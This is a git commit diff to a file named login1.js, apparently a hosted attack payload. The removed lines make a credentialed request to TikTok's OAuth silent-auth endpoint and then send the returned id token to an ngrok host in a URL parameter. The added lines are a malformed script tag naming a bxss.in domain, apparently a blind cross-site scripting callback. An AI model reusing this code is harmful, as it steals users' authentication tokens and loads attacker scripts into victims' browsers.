10f6c3a138738ed4dd963fb3e318d740f0f17687
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-12-17 22:21:08 +0700

    Update login1.js

--- login1.js
+++ login1.js
@@ -1,10 +1,3 @@
-var xhr = new XMLHttpRequest();
-xhr.onload = reqListener; 
-xhr.open("GET", "https://open-api.tiktok.com/oauth/silent_auth/?scope=openid&response_type=id_token&redirect_uri=https://832a-202-162-37-174.ngrok-free.app&state=n2HJBz1hmyv9l5hLWFIhnJM60ovpPz&nonce=zuDvLNJNYP2tAYvtceQZ7W&client_id=awhntrn8mar80rj0&response_mode=form_post");
-xhr.withCredentials = true;
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.send(null);
-
-function reqListener() {
-    window.location='https://832a-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
-};
+<script>
+src="https://cancerz.bxss.in"
+</script>
